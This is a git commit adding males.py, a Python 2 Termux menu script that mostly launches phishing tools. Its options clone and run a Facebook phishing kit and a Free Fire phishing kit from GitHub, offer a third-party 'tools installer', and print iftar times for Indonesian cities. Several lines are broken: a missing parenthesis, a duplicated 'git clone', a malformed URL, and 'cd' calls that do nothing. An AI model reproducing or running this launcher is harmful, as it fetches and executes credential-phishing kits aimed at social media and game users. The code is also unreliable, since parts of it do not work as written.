919367d5ce697d8b7a5c0c85d29fac444e1e4356
Alung12338 <64249260+Alung12338@users.noreply.github.com>
2020-04-26 06:20:21 +0000

    Add files via upload

---
+++ males.py
@@ -0,0 +1,77 @@
+# -- coding: utf-8 --
+import os
+import sys
+import time
+
+
+os.system('clear')
+os.system('figlet alung')
+print "○●○●○●○●○●○●○●○●○●○●○●○●○●○●○●○●○●○●○●"
+print "author : Alung12338"
+print "Youtube: Alung official"
+print "Github : https://github.com/Alung12338"
+print "°•°•°•°•°•°•°•°•°•°•°•°•°•°•°•°•°•°•°•"
+print
+print "[♡] menu pilihan [♡]"
+print "[1] instal bahan"
+print "[2] Phising-Fb"
+print "[3] jadwal buka puasa"
+print "[4] Phising Free fire"
+print "[5] instal tools TU4NB4DUT"
+print "[00] kembali"
+pilih = raw_input('[?]: ')
+if pilih == "1":
+        os.system('cowsay harap sabar')
+        time.sleep(3)
+        os.system('pkg install python -y')
+        os.system('pkg install python2 -y')
+        os.system('pip2 install requests -y')
+        os.system('pip2 install mechanize -y')
+        os.system('pkg install git -y')
+        os.system('pkg install figlet -y'
+        os.system('pkg install cowsay -y')
+        os.system('pkg install php')
+        os.system('gem install lolcat')
+        os.system('apt install toilet')
+        os.system('pkg install openssh')
+        os.system('pkg install autossh')
+        os.system('cowsay selesai')
+        time.sleep(4)
+        os.system('python2 males.py')
+elif pilih == "2":
+        os.system('git clone https://github.com/Alung12338/Phising-Fb')
+        os.system('cd Phising-Fb')
+        os.system('python2 Alung.py')
+elif pilih == "3":
+        print "DKI Jakarta 17:52 WIB"
+        print "Bandung 17:47 WIB"
+        print "Semarang 17:32 WIB"
+        print "Surabaya 17:27 WIB"
+        print "Makassar 18:02 WITA"
+        print "Manado 17:46 WITA"
+        print "Pontianak 17:47 WIB"
+        print "Banda Aceh 18:48 WIB"
+        print "Medan 18:33 WIB"
+        print "Padang 18:22 WIB"
+        print "Palembang 18:02 WIB"
+        print "Pekanbaru 18:19 WIB"
+        print "Mataram 18:12 WITA"
+        print "Denpasar 18:15 WITA"
+        print "Palu 18:04 WITA"
+        print "Ambon 18:28 WIT"
+        print "Jayapura 17:39 WIT"
+        print "Yogyakarta 17:36 WIB"
+        print "semoga membantu"
+elif pilih == "4":
+        os.system('git clone https://github.com/KCHTZ06/PFFv1')
+        os.system('cd PFFv1')
+        os.system('chmod +x PFFv1.sh')
+        os.system('ls')
+        os.system('bash PFFv1.sh')
+elif pilih == "5":
+        os.system('git clone git clone https://github.comTUANB4DUT/TOOLSINSTALLERv3')
+        os.system('cd TOOLSINSTALLERv3')
+        os.system('chmod + x TUANB4DUT.sh')
+        os.system('sh TUANB4DUT.sh')
+elif pilih == "00":
+        os.system('cowsay bye') 
